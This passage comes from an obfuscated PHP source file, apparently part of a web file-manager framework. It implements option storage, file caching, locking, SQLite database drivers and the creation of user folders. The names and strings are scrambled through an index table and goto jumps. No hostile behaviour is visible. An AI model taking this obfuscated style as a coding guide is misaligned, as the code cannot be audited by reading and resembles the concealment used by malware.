$û×‹äûŠ = array_filter(array_values($û×‹äûŠ)); return array_sort_by($û×‹äûŠ, $™íÏ©•€, $Œï¢°Óô); } return $û×‹äûŠ[$_SERVER[Ãìšã«™][389] . $¢‡àü—]; } public function insert($Ä•ÎìÓ) { $„øÕĞãú =& $_SERVER[Ãìšã«™]; $Ä•ÎìÓ = array_field_key($Ä•ÎìÓ, $this->field); $Í÷ÙµÔ¡ = Model($this->modelType)->get($„øÕĞãú[390], $this->optionType . $„øÕĞãú[391]); $Í÷ÙµÔ¡ = $Í÷ÙµÔ¡ ? $Í÷ÙµÔ¡ : 0; $Ä•ÎìÓ[$„øÕĞãú[392]] = ++$Í÷ÙµÔ¡; $Ä•ÎìÓ[$„øÕĞãú[193]] = time(); $Ä•ÎìÓ[$„øÕĞãú[86]] = time(); Model($this->modelType)->set($„øÕĞãú[390], $Í÷ÙµÔ¡, $this->optionType . $„øÕĞãú[391]); Model($this->modelType)->set($„øÕĞãú[389] . $Í÷ÙµÔ¡, $Ä•ÎìÓ, $this->optionType); return $Í÷ÙµÔ¡; } public function update($ˆ° ò¾, $“ê®Ò¿¼) { $›¤„Â =& $_SERVER[Ãìšã«™]; $“ê®Ò¿¼ = array_field_key($“ê®Ò¿¼, $this->field); $¤•£Ùº = $this->listData($ˆ° ò¾); if (!$¤•£Ùº || !$ˆ° ò¾) { return !1; } $“ê®Ò¿¼ = array_merge($¤•£Ùº, $“ê®Ò¿¼); $“ê®Ò¿¼[$›¤„Â[86]] = time(); return Model($this->modelType)->set($›¤„Â[389] . $ˆ° ò¾, $“ê®Ò¿¼, $this->optionType); } public function remove($ã—ğÓĞå) { if (!$ã—ğÓĞå) { return !1; } return Model($this->modelType)->remove($_SERVER[Ãìšã«™][389] . $ã—ğÓĞå, $this->optionType); } public function clear() { $Š•øì¯º =& $_SERVER[Ãìšã«™]; Model($this->modelType)->remove($Š•øì¯º[390], $this->optionType . $Š•øì¯º[391]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ù™¡®Ê–, $ØŠ‹Î¬Ù) { if (!$ØŠ‹Î¬Ù) { return !1; } $ü”õŒ’Í = $this->listData(); $ü”õŒ’Í = array_to_keyvalue($ü”õŒ’Í, $ù™¡®Ê–); return isset($ü”õŒ’Í[$ØŠ‹Î¬Ù]) ? $ü”õŒ’Í[$ØŠ‹Î¬Ù] : !1; } public function findByName($­ìÚ¥Ø) { return $this->findByKey($_SERVER[Ãìšã«™][32], $­ìÚ¥Ø); } protected function resetData($ºˆì„º) { $Ñ”ÓÔÒ =& $_SERVER[Ãìšã«™]; $ºˆì„º = is_array($ºˆì„º) ? $ºˆì„º : array(); $¬¹†·ù = array(); for ($¿ÆİÉˆò = 0; $¿ÆİÉˆò < count($ºˆì„º); $¿ÆİÉˆò++) { $¬¹†·ù[$Ñ”ÓÔÒ[389] . $ºˆì„º[$¿ÆİÉˆò][$Ñ”ÓÔÒ[392]]] = $ºˆì„º[$¿ÆİÉˆò]; } return Model($this->modelType)->set($¬¹†·ù, !1, $this->optionType); } private function getAutoName($Àûç‡ßŞ) { $ÆÕãçµ = array_to_keyvalue($this->listData(), $_SERVER[Ãìšã«™][32]); if (!$ÆÕãçµ || !isset($ÆÕãçµ[$Àûç‡ßŞ])) { return $Àûç‡ßŞ; } for ($Ò°†ÒŠ = 1; $Ò°†ÒŠ < count($ÆÕãçµ); $Ò°†ÒŠ++) { $°Ãºğ³ = $Àûç‡ßŞ . "\x28{$Ò°†ÒŠ}\51"; if (!isset($ÆÕãçµ[$°Ãºğ³])) { return $°Ãºğ³; } } return $°Ãºğ³; } } goto CâĞï°¢©‘; Câ¬µ”¯Òˆ: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Ôè»Ñ¯±, $È›Ç ë) { $ñªÓ»­‡ =& $_SERVER[Ãìšã«™]; $this->cachePath = $Ôè»Ñ¯±[$ñªÓ»­‡[78]]; $this->prefix = $ñªÓ»­‡[835]; $this->cacheTime = $È›Ç ë; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($…¥¾îÔ´) { $è¹°Œ·Ç =& $_SERVER[Ãìšã«™]; $…¥¾îÔ´ = str_replace(array($è¹°Œ·Ç[836], $è¹°Œ·Ç[98], $è¹°Œ·Ç[73]), $è¹°Œ·Ç[837], $…¥¾îÔ´); return $this->cachePath . $è¹°Œ·Ç[838] . $…¥¾îÔ´ . $è¹°Œ·Ç[839]; } public function set($­®üãÈ™, $ö—…ÒÎÓ, $®ûˆğÜ› = false) { $ëãÂú³€ = $this->getFile($­®üãÈ™); if (file_put_contents($ëãÂú³€, $this->prefix . $ö—…ÒÎÓ, LOCK_EX)) { @touch($ëãÂú³€, intval(time() + $®ûˆğÜ›)); clearstatcache(); return !0; } @unlink($ëãÂú³€); return !1; } public function get($Ú¶¯‹¥) { $¶ÊÀñ¹ = $this->getFile($Ú¶¯‹¥); if (file_exists($¶ÊÀñ¹) && filemtime($¶ÊÀñ¹) < time()) { @unlink($¶ÊÀñ¹); return !1; } $ú„ƒúÃÎ = @file_get_contents($¶ÊÀñ¹); return substr($ú„ƒúÃÎ, strlen($this->prefix)); } public function remove($÷Ûä¦¾Ù) { $ÒãÙ¥†‹ = $this->getFile($÷Ûä¦¾Ù); return @unlink($ÒãÙ¥†‹); } public function deleteAll() { $¹—øÚÚ =& $_SERVER[Ãìšã«™]; $˜ıÄÚÔî = scandir($this->cachePath); foreach ($˜ıÄÚÔî as $¿µ‰Ø´Ô) { $µ˜½°Ğğ = $this->cachePath . $¿µ‰Ø´Ô; if (strpos($µ˜½°Ğğ, $¹—øÚÚ[839]) && strpos($µ˜½°Ğğ, $¹—øÚÚ[840])) { @unlink($µ˜½°Ğğ); } } } public function clearTimeout() { $ä²¡ìÙ =& $_SERVER[Ãìšã«™]; $×Çìãä = scandir($this->cachePath); foreach ($×Çìãä as $´ºØæ°û) { $íöŸÚ• = $this->cachePath . $´ºØæ°û; if (strpos($íöŸÚ•, $ä²¡ìÙ[839]) && strpos($íöŸÚ•, $ä²¡ìÙ[840]) && filemtime($íöŸÚ•) < time()) { @unlink($íöŸÚ•); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $Õ§Ú•Ğ“ =& $_SERVER[Ãìšã«™]; if (self::$handle) { return self::$handle; } $‹âÇéØ‚ = $GLOBALS[$Õ§Ú•Ğ“[6]][$Õ§Ú•Ğ“[344]]; self::$timeout = $‹âÇéØ‚[$Õ§Ú•Ğ“[841]] ? $‹âÇéØ‚[$Õ§Ú•Ğ“[841]] : 10; $ó€É´ = _get($GLOBALS[$Õ§Ú•Ğ“[6]], $Õ§Ú•Ğ“[842]); $³ù‡’ˆŞ = $‹âÇéØ‚[$Õ§Ú•Ğ“[828]] ? $‹âÇéØ‚[$Õ§Ú•Ğ“[828]] : $Õ§Ú•Ğ“[192]; if ($³ù‡’ˆŞ == $Õ§Ú•Ğ“[21] && $ó€É´ == $Õ§Ú•Ğ“[13]) { $³ù‡’ˆŞ = $Õ§Ú•Ğ“[192]; } switch ($³ù‡’ˆŞ) { case $Õ§Ú•Ğ“[831]: self::$handle = new CacheLockRedis(); break; case $Õ§Ú•Ğ“[832]: self::$handle = new CacheLockMemcached(); break; case $Õ§Ú•Ğ“[21]: self::$handle = new CacheLockDatabase(); break; case $Õ§Ú•Ğ“[192]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($Õ§Ú•Ğ“[843], $Õ§Ú•Ğ“[844]); } return self::$handle; } private static function key($‡³Ø÷—µ) { return $_SERVER[Ãìšã«™][845] . Cache::key($‡³Ø÷—µ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ñ›ÀË = '') { self::$errorMsg = $ñ›ÀË; } public static function lockGlobal($‰öÑËÎº, $òÒ§ìÃæ) { return self::lock($‰öÑËÎº, $òÒ§ìÃæ, !0); } public static function lock($Îú™ëÊ, $½ÜåÖÅ = false, $Ü™¬×ËÇ = false) { $Ñ–ï¹é =& $_SERVER[Ãìšã«™]; $§•éšÂª = self::init(); $½øèéğ˜ = self::key($Îú™ëÊ); $½ÜåÖÅ = $½ÜåÖÅ ? $½ÜåÖÅ : self::$timeout; $¿¼ÚÏ—Ü = $§•éšÂª->lock($½øèéğ˜, $½ÜåÖÅ); $÷Çü•¡± = timeFloat(); if (!$¿¼ÚÏ—Ü) { $‰ù†‡ß” = "\154\x6f\x63\x6b\x20\x65\162\162\x6f\x72\73\x6b\145\x79\x3d{$Îú™ëÊ}\73\x74\151\x6d\145\x3d{$½ÜåÖÅ}\x3b" . self::$errorMsg . $Ñ–ï¹é[71] . get_caller_msg(); $”Å­îÄ  = LNG($Ñ–ï¹é[846]) . "\x28{$½ÜåÖÅ}\163\x29\56" . LNG($Ñ–ï¹é[847]); $”Å­îÄ  .= $Ñ–ï¹é[848]; if (is_string(self::$errorMsg) && self::$errorMsg) { $”Å­îÄ  = $”Å­îÄ  . $Ñ–ï¹é[849] . self::$errorMsg; } write_log($‰ù†‡ß”, $Ñ–ï¹é[844]); show_json($”Å­îÄ , !1); } if (!$Ü™¬×ËÇ) { self::$lockItem[$½øèéğ˜] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $İ¯¸Öí½ = number_format(timeFloat() - $÷Çü•¡±, 3); write_log($Ñ–ï¹é[850] . $Îú™ëÊ . $Ñ–ï¹é[851] . $İ¯¸Öí½, $Ñ–ï¹é[844]); } return $¿¼ÚÏ—Ü; } public static function lockGet($´Öö’¦û) { $úàÃÒµÍ = self::key($´Öö’¦û); if (self::$lockItem[$úàÃÒµÍ]) { return self::$lockItem[$úàÃÒµÍ]; } return self::init()->lockGet($úàÃÒµÍ); } public static function unlock($İÈ½¦ª) { $ı­¦êÊÛ =& $_SERVER[Ãìšã«™]; $ñî­ ë£ = self::key($İÈ½¦ª); self::$lockItem[$ñî­ ë£] = null; self::init()->unlock($ñî­ ë£); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ı­¦êÊÛ[852] . $İÈ½¦ª, $ı­¦êÊÛ[844]); } return; } public static function unlockRuntime() { $úé²•ÁÇ =& $_SERVER[Ãìšã«™]; $£œ•è»ã = self::init(); $–ıñ„µ = !1; foreach (self::$lockItem as $êÓáŒ© => $ïœŞ¿ğÕ) { if (!$ïœŞ¿ğÕ) { continue; } $£œ•è»ã->unlock($êÓáŒ©); if (!$–ıñ„µ) { $–ıñ„µ = !0; write_log($úé²•ÁÇ[853] . $êÓáŒ© . $úé²•ÁÇ[71] . get_caller_msg(), $úé²•ÁÇ[844]); continue; } write_log($úé²•ÁÇ[853] . $êÓáŒ©, $úé²•ÁÇ[844]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $À¹ÎÄ–“ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($úé²•ÁÇ[854] . $À¹ÎÄ–“ . $úé²•ÁÇ[855] . ACTION, $úé²•ÁÇ[844]); } } public static function fileLock($Òé¢¡Á¾) { $½Œ¼·Åü =& $_SERVER[Ãìšã«™]; if (!$GLOBALS[$½Œ¼·Åü[856]]) { $GLOBALS[$½Œ¼·Åü[856]] = array(); } $GLOBALS[$½Œ¼·Åü[856]][$Òé¢¡Á¾] = !1; $ûÂìÈÔê = fopen(DATA_PATH . $Òé¢¡Á¾ . $½Œ¼·Åü[857], $½Œ¼·Åü[858]); if (!$ûÂìÈÔê) { return !1; } $GLOBALS[$½Œ¼·Åü[856]][$Òé¢¡Á¾] = $ûÂìÈÔê; if (flock($ûÂìÈÔê, LOCK_EX)) { return !0; } self::unlock($Òé¢¡Á¾); show_json($½Œ¼·Åü[859], !1); return !1; } public static function fileUnlock($ä—ıÊ¹œ) { $²ëâôíà =& $_SERVER[Ãìšã«™]; $û»×Ê˜ = $GLOBALS[$²ëâôíà[856]][$ä—ıÊ¹œ]; if (!$û»×Ê˜) { return; } $GLOBALS[$²ëâôíà[856]][$ä—ıÊ¹œ] = !1; flock($û»×Ê˜, LOCK_UN); fclose($û»×Ê˜); } public static function fileUnlockAll() { $ÙÈâ‰“Ø =& $_SERVER[Ãìšã«™]; if (!$GLOBALS[$ÙÈâ‰“Ø[856]]) { return; } foreach ($GLOBALS[$ÙÈâ‰“Ø[856]] as $ÜÔˆ£­¸ => $”ˆ¥€«) { if (!$”ˆ¥€«) { continue; } $GLOBALS[$ÙÈâ‰“Ø[856]][$ÜÔˆ£­¸] = !1; flock($”ˆ¥€«, LOCK_UN); fclose($”ˆ¥€«); } $GLOBALS[$ÙÈâ‰“Ø[856]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto d£æ·¾¶ğ; eùÌêÊ¦¬ : class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $åşŒîÍÀ =& $_SERVER[Ãìšã«™]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$åşŒîÍÀ[6]] =& $config; $this->values[$åşŒîÍÀ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $åşŒîÍÀ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($¢Á¦Ñ¼´) { if (1 === func_num_args()) { $this->{$¢Á¦Ñ¼´} = new $¢Á¦Ñ¼´(); } else { $²¸€Û˜æ = new ReflectionClass($¢Á¦Ñ¼´); $¨´»ı = func_get_args(); array_shift($¨´»ı); $this->{$¢Á¦Ñ¼´} = $²¸€Û˜æ->newInstanceArgs($¨´»ı); } return $this->{$¢Á¦Ñ¼´}; } public function routeBind($ì–òµ†Ø, $È©õ”Ù¾, $Ğş¿÷ÈÓ = 3) { $»¿ó«óû =& $_SERVER[Ãìšã«™]; $şŠ† £è = $this->in[$»¿ó«óû[9]]; $ì–òµ†Ø = str_replace($»¿ó«óû[10], $»¿ó«óû[11], trim(trim($ì–òµ†Ø, $»¿ó«óû[8]), $»¿ó«óû[12])); if (!$ì–òµ†Ø || count($şŠ† £è) <= $Ğş¿÷ÈÓ) { return !1; } $ø±ì•Ë = !0; $˜êò÷ø¥ = explode($»¿ó«óû[8], $ì–òµ†Ø); for ($ÚªñÂ¢ï = 0; $ÚªñÂ¢ï < count($˜êò÷ø¥); $ÚªñÂ¢ï++) { if ($˜êò÷ø¥[$ÚªñÂ¢ï] != $şŠ† £è[$Ğş¿÷ÈÓ + $ÚªñÂ¢ï]) { $ø±ì•Ë = !1; break; } } if (!$ø±ì•Ë) { return; } call_user_func_array(array($this, $È©õ”Ù¾), array()); } public function routeArgs($º†ˆ¬ï  = 3) { $¾ıîÆïĞ = $this->in[$_SERVER[Ãìšã«™][9]]; if (count($¾ıîÆïĞ) <= $º†ˆ¬ï ) { return array(); } $³ÙÑı´“ = array(); for ($ªĞš¯ì™ = $º†ˆ¬ï ; $ªĞš¯ì™ < count($¾ıîÆïĞ); $ªĞš¯ì™ += 2) { $³ÙÑı´“[$¾ıîÆïĞ[$ªĞš¯ì™]] = $¾ıîÆïĞ[$ªĞš¯ì™ + 1]; $this->in[$¾ıîÆïĞ[$ªĞš¯ì™]] = $¾ıîÆïĞ[$ªĞš¯ì™ + 1]; } return $³ÙÑı´“; } protected function assign($³Áø¢Ø¿, $Ó¤î¦ë©) { $this->values[$³Áø¢Ø¿] = $Ó¤î¦ë©; } protected function display($‚ğ–º³) { ob_end_clean(); extract($this->values); require $this->tpl . $‚ğ–º³; } } class DbSqliteBase extends Db { public function __construct($Ä¯„ë€à = '') { $õãË¼æ¤ =& $_SERVER[Ãìšã«™]; if (!extension_loaded($õãË¼æ¤[13])) { think_exception(think_lang($õãË¼æ¤[14]) . $õãË¼æ¤[15]); } if (!empty($Ä¯„ë€à)) { if (!isset($Ä¯„ë€à[$õãË¼æ¤[16]])) { $Ä¯„ë€à[$õãË¼æ¤[16]] = 438; } $this->config = $Ä¯„ë€à; if (empty($this->config[$õãË¼æ¤[17]])) { $this->config[$õãË¼æ¤[17]] = array(); } } } public function connect($×ºø² ğ = '', $…‘İĞÀµ = 0) { $‰Æå§Ü‹ =& $_SERVER[Ãìšã«™]; if (!isset($this->linkID[$…‘İĞÀµ])) { if (empty($×ºø² ğ)) { $×ºø² ğ = $this->config; } $†Åƒ€ğë = !empty($×ºø² ğ[$‰Æå§Ü‹[17]][$‰Æå§Ü‹[18]]) ? $×ºø² ğ[$‰Æå§Ü‹[17]][$‰Æå§Ü‹[18]] : $this->pconnect; $ÊÓÈèæº = $†Åƒ€ğë ? $‰Æå§Ü‹[19] : $‰Æå§Ü‹[20]; $this->linkID[$…‘İĞÀµ] = $ÊÓÈèæº($×ºø² ğ[$‰Æå§Ü‹[21]], $×ºø² ğ[$‰Æå§Ü‹[16]]); if (!$this->linkID[$…‘İĞÀµ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$…‘İĞÀµ], 30000); if (1 != think_config($‰Æå§Ü‹[22])) { unset($this->config); } } return $this->linkID[$…‘İĞÀµ]; } public function free() { $this->queryID = null; } public function query($×Áú­Ü´) { $ã”Ûç =& $_SERVER[Ãìšã«™]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $×Áú­Ü´; if ($this->queryID) { $this->free(); } think_action_status($ã”Ûç[23], 1); think_status($ã”Ûç[24]); $this->queryID = sqlite_query($this->_linkID, $×Áú­Ü´); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Âá‹“âÑ = $this->getAll(); return $Âá‹“âÑ; } } public function execute($¹ôßõæ) { $ƒÔæ£“¡ =& $_SERVER[Ãìšã«™]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¹ôßõæ; if ($this->queryID) { $this->free(); } think_action_status($ƒÔæ£“¡[25], 1); think_status($ƒÔæ£“¡[24]); $Îıöø†× = sqlite_exec($this->_linkID, $¹ôßõæ); $this->debug(); if (!1 === $Îıöø†×) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ãìšã«™][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ßª™¦Ã = sqlite_query($this->_linkID, $_SERVER[Ãìšã«™][27]); if (!$ßª™¦Ã) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ª”®äÅâ = sqlite_query($this->_linkID, $_SERVER[Ãìšã«™][28]); if (!$ª”®äÅâ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ÒèÜÔÖ‘ = array(); if ($this->numRows > 0) { for ($ë÷Á®Í‹ = 0; $ë÷Á®Í‹ < $this->numRows; $ë÷Á®Í‹++) { $ÒèÜÔÖ‘[$ë÷Á®Í‹] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ÒèÜÔÖ‘; } public function getFields($Ü¯ğşŸ‡) { $Ş©êŸµÆ =& $_SERVER[Ãìšã«™]; $Ûìøå» = $this->query($Ş©êŸµÆ[29] . $Ü¯ğşŸ‡ . $Ş©êŸµÆ[30]); $†ÒæŞŠË = array(); if ($Ûìøå») { foreach ($Ûìøå» as $ÊÁ»î– => $Û™¹è) { $†ÒæŞŠË[$Û™¹è[$Ş©êŸµÆ[31]]] = array($Ş©êŸµÆ[32] => $Û™¹è[$Ş©êŸµÆ[31]], $Ş©êŸµÆ[33] => $Û™¹è[$Ş©êŸµÆ[34]], $Ş©êŸµÆ[35] => (bool) ($Û™¹è[$Ş©êŸµÆ[36]] === $Ş©êŸµÆ[12]), $Ş©êŸµÆ[37] => $Û™¹è[$Ş©êŸµÆ[38]], $Ş©êŸµÆ[39] => strtolower($Û™¹è[$Ş©êŸµÆ[40]]) == $Ş©êŸµÆ[41], $Ş©êŸµÆ[42] => strtolower($Û™¹è[$Ş©êŸµÆ[43]]) == $Ş©êŸµÆ[44]); } } return $†ÒæŞŠË; } public function getTables($¸ÛÈ’…“ = '') { $¢òòƒìÅ =& $_SERVER[Ãìšã«™]; $Ùì©£”ó = $this->query($¢òòƒìÅ[45] . $¢òòƒìÅ[46] . $¢òòƒìÅ[47]); $Õ½á”£¡ = array(); foreach ($Ùì©£”ó as $´à¾Ë => $Ø×¶”Ê) { $Õ½á”£¡[$´à¾Ë] = current($Ø×¶”Ê); } return $Õ½á”£¡; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $î¨¼³ÓŒ =& $_SERVER[Ãìšã«™]; $ä¡†êò” = sqlite_last_error($this->_linkID); $this->error = $ä¡†êò” . $î¨¼³ÓŒ[4] . sqlite_error_string($ä¡†êò”); if ($î¨¼³ÓŒ[12] != $this->queryStr) { $this->error .= LNG($î¨¼³ÓŒ[48]) . $this->queryStr; } think_trace($this->error, $î¨¼³ÓŒ[12], $î¨¼³ÓŒ[49]); return $this->error; } public function escapeString($·å»Ÿéó) { return sqlite_escape_string($·å»Ÿéó); } public function parseLimit($ğëõ¢›Ø) { $ÍèÈƒ—ë =& $_SERVER[Ãìšã«™]; $¯ÉË¿ìğ = $ÍèÈƒ—ë[12]; if (!empty($ğëõ¢›Ø)) { $ğëõ¢›Ø = explode($ÍèÈƒ—ë[50], $ğëõ¢›Ø); if (count($ğëõ¢›Ø) > 1) { $¯ÉË¿ìğ .= $ÍèÈƒ—ë[51] . $ğëõ¢›Ø[1] . $ÍèÈƒ—ë[52] . $ğëõ¢›Ø[0] . $ÍèÈƒ—ë[53]; } else { $¯ÉË¿ìğ .= $ÍèÈƒ—ë[51] . $ğëõ¢›Ø[0] . $ÍèÈƒ—ë[53]; } } return $¯ÉË¿ìğ; } } class DbSqlite3Base extends Db { public function __construct($Ùé­­¿İ = '') { $„Íâ‹£ˆ =& $_SERVER[Ãìšã«™]; if (!class_exists($„Íâ‹£ˆ[54])) { think_exception(think_lang($„Íâ‹£ˆ[14]) . $„Íâ‹£ˆ[55]); } if (!empty($Ùé­­¿İ)) { if (!isset($Ùé­­¿İ[$„Íâ‹£ˆ[16]])) { $Ùé­­¿İ[$„Íâ‹£ˆ[16]] = 438; } $this->config = $Ùé­­¿İ; if (empty($this->config[$„Íâ‹£ˆ[17]])) { $this->config[$„Íâ‹£ˆ[17]] = array(); } } } public function connect($¯Óış¬Ò = '', $·è×øÑ = 0) { $ÜşùÆŸß =& $_SERVER[Ãìšã«™]; if (!isset($this->linkID[$·è×øÑ])) { if (empty($¯Óış¬Ò)) { $¯Óış¬Ò = $this->config; } $this->linkID[$·è×øÑ] = new SQLite3($¯Óış¬Ò[$ÜşùÆŸß[21]]); if (!$this->linkID[$·è×øÑ]) { think_exception($this->linkID[$·è×øÑ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$·è×øÑ]->busyTimeout(30000); if (1 != think_config($ÜşùÆŸß[22])) { unset($this->config); } } return $this->linkID[$·è×øÑ]; } public function free() { $this->queryID = null; } public function query($½‚ë¼‰) { $½“ğ¢øÇ =& $_SERVER[Ãìšã«™]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $½‚ë¼‰; if ($this->queryID) { $this->free(); } think_action_status($½“ğ¢øÇ[23], 1); think_status($½“ğ¢øÇ[24]); $this->queryID = $this->_linkID->query($½‚ë¼‰); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Ëß„¸è™ = $this->getAll(); $this->numRows = count($Ëß„¸è™); return $Ëß„¸è™; } } public function execute($ÁÆ•Øá) { $Ã°Ú½éƒ =& $_SERVER[Ãìšã«™]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÁÆ•Øá; if ($this->queryID) { $this->free(); } think_action_status($Ã°Ú½éƒ[25], 1); think_status($Ã°Ú½éƒ[24]); $ÆÇ ¶„à = $this->_linkID->exec($ÁÆ•Øá); $this->debug(); if (!1 === $ÆÇ ¶„à) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ãìšã«™][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $½óÈİ½  = $this->_linkID->query($_SERVER[Ãìšã«™][27]); if (!$½óÈİ½ ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ôä„°˜· = $this->_linkID->query($_SERVER[Ãìšã«™][28]); if (!$ôä„°˜·) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ÍÁŞõ¯° = array(); while ($Ÿê½ÏÖ§ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ÍÁŞõ¯°[] = $Ÿê½ÏÖ§; } $this->queryID->reset(); return $ÍÁŞõ¯°; } public function getFields($ÕŞãøÃÓ) { $¼îÈšÈÔ =& $_SERVER[Ãìšã«™]; $øµÀÙ¼ = $this->query($¼îÈšÈÔ[29] . $ÕŞãøÃÓ . $¼îÈšÈÔ[30]); $½ğşûæ¢ = array(); if ($øµÀÙ¼) { foreach ($øµÀÙ¼ as $˜Ç“áÉ => $¾»ÌÇµá) { $½ğşûæ¢[$¾»ÌÇµá[$¼îÈšÈÔ[32]]] = array($¼îÈšÈÔ[32] => $¾»ÌÇµá[$¼îÈšÈÔ[32]], $¼îÈšÈÔ[33] => $¾»ÌÇµá[$¼îÈšÈÔ[33]], $¼îÈšÈÔ[35] => (bool) ($¾»ÌÇµá[$¼îÈšÈÔ[35]] === $¼îÈšÈÔ[12]), $¼îÈšÈÔ[37] => $¾»ÌÇµá[$¼îÈšÈÔ[56]], $¼îÈšÈÔ[39] => (bool) $¾»ÌÇµá[$¼îÈšÈÔ[57]], $¼îÈšÈÔ[42] => (bool) $¾»ÌÇµá[$¼îÈšÈÔ[57]]); } } return $½ğşûæ¢; } public function getTables($üÈ–Äˆà = '') { $º¶»¹ìŒ =& $_SERVER[Ãìšã«™]; $äÍÁ·­« = $this->query($º¶»¹ìŒ[45] . $º¶»¹ìŒ[46] . $º¶»¹ìŒ[47]); $ïòä„ĞÇ = array(); foreach ($äÍÁ·­« as $Ş¼ìÚĞá => $—«Î‡¢Ğ) { $ïòä„ĞÇ[$Ş¼ìÚĞá] = current($—«Î‡¢Ğ); } return $ïòä„ĞÇ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ÊØË¸Ó¨ =& $_SERVER[Ãìšã«™]; $this->error = $this->_linkID->lastErrorMsg(); if ($ÊØË¸Ó¨[12] != $this->queryStr) { $this->error .= LNG($ÊØË¸Ó¨[48]) . $this->queryStr; } think_trace($this->error, $ÊØË¸Ó¨[12], $ÊØË¸Ó¨[49]); return $this->error; } public function escapeString($ïòÊÖâ) { $–Ü÷ÕøÈ =& $_SERVER[Ãìšã«™]; if ($this->_linkID) { return $this->_linkID->escapeString($ïòÊÖâ); } return str_ireplace($–Ü÷ÕøÈ[58], $–Ü÷ÕøÈ[59], $ïòÊÖâ); } public function parseLimit($Éëş»å) { $ú¾ñƒáÂ =& $_SERVER[Ãìšã«™]; $à–‡óş× = $ú¾ñƒáÂ[12]; if (!empty($Éëş»å)) { $Éëş»å = explode($ú¾ñƒáÂ[50], $Éëş»å); if (count($Éëş»å) > 1) { $à–‡óş× .= $ú¾ñƒáÂ[51] . $Éëş»å[1] . $ú¾ñƒáÂ[52] . $Éëş»å[0] . $ú¾ñƒáÂ[53]; } else { $à–‡óş× .= $ú¾ñƒáÂ[51] . $Éëş»å[0] . $ú¾ñƒáÂ[53]; } } return $à–‡óş×; } } goto B„ÃƒùÌ‘–; C±í·›òÆ: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($•¶ªÎÜ½) { $È­øôÑª =& $_SERVER[Ãìšã«™]; $Âç×„°í = Model($È­øôÑª[513])->where(array($È­øôÑª[1641] => $•¶ªÎÜ½))->find(); $ˆğ±®ƒ = $this->_mkdirRoot(SourceModel::TYPE_USER, $•¶ªÎÜ½, $Âç×„°í[$È­øôÑª[32]]); $this->userDesktopAdd($ˆğ±®ƒ); return $ˆğ±®ƒ; } public function userDesktopAdd($ô¬Ë×µ¦) { $³–ğö¤ =& $_SERVER[Ãìšã«™]; $«¡ÂÃÕ¹ = LNG($³–ğö¤[2080]); $‰…·×òÉ = $this->mkdir($ô¬Ë×µ¦, $«¡ÂÃÕ¹); $this->metaSet($‰…·×òÉ, $³–ğö¤[2081], $³–ğö¤[89]); $this->metaSet($ô¬Ë×µ¦, $³–ğö¤[2082], $‰…·×òÉ); } public function groupRootAdd($ğ÷şÎñê) { $´²©Úåô =& $_SERVER[Ãìšã«™]; $ÇÃ½Å³ = Model($´²©Úåô[522])->where(array($´²©Úåô[1905] => $ğ÷şÎñê))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ğ÷şÎñê, $ÇÃ½Å³[$´²©Úåô[32]]); } public function systemRootPathAdd($ä«ğÑÖ) { if ($ä«ğÑÖ != $_SERVER[Ãìšã«™][537]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ä«ğÑÖ); } public function userRootRemove($ê¦ñúıå) { $¬„˜×„× = $this->sourceRoot(SourceModel::TYPE_USER, $ê¦ñúıå); if (!$¬„˜×„×) { return; } $this->remove($¬„˜×„×, !1); } public function groupRootRemove($åäÎš¦) 